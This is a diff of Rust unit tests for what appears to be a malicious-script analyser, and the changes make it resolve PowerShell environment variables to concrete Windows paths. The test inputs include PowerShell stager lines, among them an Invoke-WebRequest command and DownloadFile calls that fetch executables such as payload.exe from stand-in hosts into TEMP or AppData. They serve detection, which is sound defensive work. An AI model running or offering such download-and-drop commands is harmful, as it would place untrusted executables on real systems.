@@ -3461,14 +3461,16 @@ mod ps_iwr_variants_tests {
             matches!(t,
                 Trait::Download { src, dst, .. }
                     if src == "http://x.example/a.pdf"
-                        && dst.as_deref() == Some("$env:temp\\a.pdf")
+                        && dst.as_deref()
+                            == Some("C:\\Users\\puncher\\AppData\\Local\\Temp\\a.pdf")
             )
         });
         let has_exe = report.traits.iter().any(|t| {
             matches!(t,
                 Trait::Download { src, dst, .. }
                     if src == "http://x.example/b.exe"
-                        && dst.as_deref() == Some("$env:temp\\b.exe")
+                        && dst.as_deref()
+                            == Some("C:\\Users\\puncher\\AppData\\Local\\Temp\\b.exe")
             )
         });
         assert!(
@@ -3671,6 +3673,30 @@ mod explicit_environment_tests {
                 )
             }),
             "empty env segment broke joined URL assembly: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn baseline_windows_environment_is_available_to_powershell_env_refs() {
+        let script = br#"powershell -Command "$u=$env:TEMP+'\\payload.exe';Invoke-WebRequest https://baseline-env.example/payload.exe -OutFile $u""#;
+
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download {
+                        src,
+                        dst: Some(dst),
+                        ..
+                    } if src == "https://baseline-env.example/payload.exe"
+                        && dst.contains("AppData\\Local\\Temp")
+                )
+            }),
+            "baseline Windows env did not resolve in PowerShell: {:?}\n{}",
             report.traits,
             report.deobfuscated
         );
@@ -15042,7 +15068,8 @@ $clnt.$method.Invoke($url,$file)
             matches!(t,
                 Trait::Download { src, dst, .. }
                     if src == "https://dynamic-downloadfile.example/tool.exe"
-                        && dst.as_deref() == Some("$env:APPDATA\\tool.exe")
+                        && dst.as_deref()
+                            == Some("C:\\Users\\puncher\\AppData\\Roaming\\tool.exe")
             )
         });
         assert!(
@@ -15064,7 +15091,8 @@ $boliganvisninger.'DownloadFile'.Invoke('https://dynamic-chained-dst.example/sta
             matches!(t,
                 Trait::Download { src, dst, .. }
                     if src == "https://dynamic-chained-dst.example/stage.txt"
-                        && dst.as_deref() == Some("$env:appdata\\Allitterationers234.Afs")
+                        && dst.as_deref()
+                            == Some("C:\\Users\\puncher\\AppData\\Roaming\\Allitterationers234.Afs")
             )
         });
         assert!(
@@ -15086,7 +15114,8 @@ $clnt.DownloadFile($url,$exeFile)
             matches!(t,
                 Trait::Download { src, dst, .. }
                     if src == "https://download-path-combine.example/setup.exe"
-                        && dst.as_deref() == Some("$env:TEMP\\setup.exe")
+                        && dst.as_deref()
+                            == Some("C:\\Users\\puncher\\AppData\\Local\\Temp\\setup.exe")
             )
         });
         assert!(
@@ -15129,7 +15158,8 @@ Invoke-WebRequest -Uri $url -OutFile $outputPath
             matches!(t,
                 Trait::Download { src, dst, .. }
                     if src == "https://raw-iwr.example/stage.zip"
-                        && dst.as_deref() == Some("$outputPath")
+                        && dst.as_deref()
+                            == Some("C:\\Users\\puncher\\AppData\\Local\\Temp\\stage.zip")
             )
         });
         assert!(
